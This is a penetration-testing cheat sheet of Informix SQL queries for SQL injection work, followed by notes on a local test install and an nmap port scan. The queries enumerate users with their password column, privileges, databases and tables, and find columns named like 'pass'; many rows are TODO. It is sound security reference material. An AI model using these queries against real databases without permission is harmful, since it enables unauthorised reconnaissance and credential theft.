# Informix SQL Injection Cheat Sheet
Author: pentestmonkey

<table border="1">
<tbody>
<tr>
<td>Version</td>
<td>SELECT DBINFO(&#8216;version&#8217;, &#8216;full&#8217;) FROM systables WHERE tabid = 1;<br />
SELECT DBINFO(&#8216;version&#8217;, &#8216;server-type&#8217;) FROM systables WHERE tabid = 1;<br />
SELECT DBINFO(&#8216;version&#8217;, &#8216;major&#8217;), DBINFO(&#8216;version&#8217;, &#8216;minor&#8217;), DBINFO(&#8216;version&#8217;, &#8216;level&#8217;) FROM systables WHERE tabid = 1;<br />
SELECT DBINFO(&#8216;version&#8217;, &#8216;os&#8217;) FROM systables WHERE tabid = 1; &#8212; T=Windows, U=32 bit app on 32-bit Unix, H=32-bit app running on 64-bit Unix, F=64-bit app running on 64-bit unix</td>
</tr>
<tr>
<td>Comments</td>
<td>select 1 FROM systables WHERE tabid = 1; &#8212; comment</td>
</tr>
<tr>
<td>Current User</td>
<td>SELECT USER FROM systables WHERE tabid = 1;<br />
select CURRENT_ROLE FROM systables WHERE tabid = 1;</td>
</tr>
<tr>
<td>List Users</td>
<td>select username, usertype, password from sysusers;</td>
</tr>
<tr>
<td>List Password Hashes</td>
<td>TODO</td>
</tr>
<tr>
<td>List Privileges</td>
<td>select tabname, grantor, grantee, tabauth FROM systabauth join systables on systables.tabid = systabauth.tabid; &#8212; which tables are accessible by which users<br />
select procname, owner, grantor, grantee from sysprocauth join sysprocedures on sysprocauth.procid = sysprocedures.procid; &#8212; which procedures are accessible by which users</td>
</tr>
<tr>
<td>List DBA Accounts</td>
<td>TODO</td>
</tr>
<tr>
<td>Current Database</td>
<td>SELECT DBSERVERNAME FROM systables where tabid = 1; &#8212; server name</td>
</tr>
<tr>
<td>List Databases</td>
<td>select name, owner from sysdatabases;</td>
</tr>
<tr>
<td>List Columns</td>
<td>select tabname, colname, owner, coltype FROM syscolumns join systables on syscolumns.tabid = systables.tabid;</td>
</tr>
<tr>
<td>List Tables</td>
<td>select tabname, owner FROM systables;<br />
select tabname, viewtext FROM sysviews  join systables on systables.tabid = sysviews.tabid;</td>
</tr>
<tr>
<td>List Stored Procedures</td>
<td>select procname, owner FROM sysprocedures;</td>
</tr>
<tr>
<td>Find Tables From Column Name</td>
<td>select tabname, colname, owner, coltype FROM syscolumns join systables on syscolumns.tabid = systables.tabid where colname like &#8216;%pass%&#8217;;</td>
</tr>
<tr>
<td>Select Nth Row</td>
<td>select first 1 tabid from (select first 10 tabid from systables order by tabid) as sq order by tabid desc; &#8212; selects the 10th row</td>
</tr>
<tr>
<td>Select Nth Char</td>
<td>SELECT SUBSTRING(&#8216;ABCD&#8217; FROM 3 FOR 1) FROM systables where tabid = 1; &#8212; returns &#8216;C&#8217;</td>
</tr>
<tr>
<td>Bitwise AND</td>
<td>select bitand(6, 1) from systables where tabid = 1; &#8212; returns 0<br />
select bitand(6, 2) from systables where tabid = 1; &#8212; returns 2</td>
</tr>
<tr>
<td>ASCII Value -&gt; Char</td>
<td>TODO</td>
</tr>
<tr>
<td>Char -&gt; ASCII Value</td>
<td>select ascii(&#8216;A&#8217;) from systables where tabid = 1;</td>
</tr>
<tr>
<td>Casting</td>
<td>select cast(&#8217;123&#8242; as integer) from systables where tabid = 1;<br />
select cast(1 as char) from systables where tabid = 1;</td>
</tr>
<tr>
<td>String Concatenation</td>
<td>SELECT &#8216;A&#8217; || &#8216;B&#8217; FROM systables where tabid = 1; &#8212; returns &#8216;AB&#8217;<br />
SELECT concat(&#8216;A&#8217;, &#8216;B&#8217;) FROM systables where tabid = 1; &#8212; returns &#8216;AB&#8217;</td>
</tr>
<tr>
<td>String Length</td>
<td>SELECT tabname, length(tabname), char_length(tabname), octet_length(tabname) from systables;</td>
</tr>
<tr>
<td>If Statement</td>
<td>TODO</td>
</tr>
<tr>
<td>Case Statement</td>
<td>select tabid, case when tabid&gt;10 then &#8220;High&#8221; else &#8216;Low&#8217; end from systables;</td>
</tr>
<tr>
<td>Avoiding Quotes</td>
<td>TODO</td>
</tr>
<tr>
<td>Time Delay</td>
<td>TODO</td>
</tr>
<tr>
<td>Make DNS Requests</td>
<td>TODO</td>
</tr>
<tr>
<td>Command Execution</td>
<td>TODO</td>
</tr>
<tr>
<td>Local File Access</td>
<td>TODO</td>
</tr>
<tr>
<td>Hostname, IP Address</td>
<td>SELECT DBINFO(&#8216;dbhostname&#8217;) FROM systables WHERE tabid = 1; &#8212; hostname</td>
</tr>
<tr>
<td>Location of DB files</td>
<td>TODO</td>
</tr>
<tr>
<td>Default/System Databases</td>
<td>These are the system databases:<br />
sysmaster<br />
sysadmin*<br />
sysuser*<br />
sysutils*</td>
</tr>
</tbody>
</table>
<p>* = don&#8217;t seem to contain anything / don&#8217;t allow readingInstalling Locally</p>
<p>You can download <a href="http://www.ibm.com/developerworks/downloads/im/dsexp/?S_TACT=105AGX11&amp;S_CMP=LP">Informix Dynamic Server Express Edition 11.5 Trial</a> for Linux and Windows.</p>
<p>Database ClientThere&#8217;s a <a href="http://www14.software.ibm.com/webapp/download/search.jsp?rs=ifxdl">database client SDK</a> available, but I couldn&#8217;t get the demo client working.<br />
I used <a href="http://squirrel-sql.sourceforge.net/">SQuirreL SQL Client Version 2.6.8</a> after installing the <a href="http://www14.software.ibm.com/webapp/download/search.jsp?go=y&amp;rs=ifxjdbc">Informix JDBC drivers</a> (&#8220;emerge dev-java/jdbc-informix&#8221; on Gentoo).Logging in from command line</p>
<p>If you get local admin rights on a Windows box and have a GUI logon:</p>
<ul>
<li>Click: Start | All Programs | IBM Informix Dynamic Server 11.50 | someservername.  This will give you a command prompt with various Environment variables set properly.</li>
<li>Run dbaccess.exe from your command prompt.  This will bring up a text-based GUI that allows you to browse databases.</li>
</ul>
<p>The following were set on my test system.  This may help if you get command line access, but can&#8217;t get a GUI &#8211; you&#8217;ll need to change &#8220;testservername&#8221;:</p>
<pre>set INFORMIXDIR=C:PROGRA~1IBMIBMINF~111.50
set INFORMIXSERVER=testservername
set ONCONFIG=ONCONFIG.testservername
set PATH=C:PROGRA~1IBMIBMINF~111.50bin;C:WINDOWSsystem32;C:WINDOWS;C:WINDOWSSystem32Wbem;C:PROGRA~1ibmgsk7bin;C:PROGRA~1ibmgsk7lib;C:Program FilesIBMInformixClien-SDKbin;C:Program Filesibmgsk7bin;C:Program Filesibmgsk7lib
set CLASSPATH=C:PROGRA~1IBMIBMINF~111.50extendkrakatoakrakatoa.jar;C:PROGRA~1IBMIBMINF~111.50xtendkrakatoajdbc.jar;
set DBTEMP=C:PROGRA~1IBMIBMINF~111.50infxtmp
set CLIENT_LOCALE=EN_US.CP1252
set DB_LOCALE=EN_US.8859-1
set SERVER_LOCALE=EN_US.CP1252
set DBLANG=EN_US.CP1252
mode con codepage select=1252</pre>
<pre>Identifying on the network</pre>
<p>My default installation listened on two TCP ports: 9088 and 9099.  When I created a new &#8220;server name&#8221;, this listened on 1526/TCP by default.  Nmap 4.76 didn&#8217;t identify these ports as Informix:</p>
<p>$ sudo nmap -sS -sV 10.0.0.1 -p- -v &#8211;version-all<br />
&#8230;<br />
1526/tcp open  pdap-np?<br />
9088/tcp open  unknown<br />
9089/tcp open  unknown<br />
&#8230;<br />
